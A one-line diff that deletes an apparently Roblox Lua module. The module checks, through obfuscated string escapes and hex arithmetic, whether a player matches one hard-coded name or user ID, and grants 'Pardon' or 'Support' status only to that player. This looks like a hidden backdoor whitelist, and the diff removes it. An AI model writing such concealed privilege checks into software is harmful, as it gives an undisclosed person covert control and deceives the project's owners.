@@ -1,1 +1,0 @@
-local a={}local b=tonumber;function a:Velocity()return true end;local c={"\80\57\57\115\121\66\111\121"}local d={b(0x3969764B+0xE3D5)}function a:Pardon(e)for f,g in pairs(c)do if e:IsA("Player")and e.Name==g then return true end end;return false end;function a:Support(e)for f,g in pairs(d)do if e:IsA("Player")and e.UserId==g then return true end end;return false end;return a
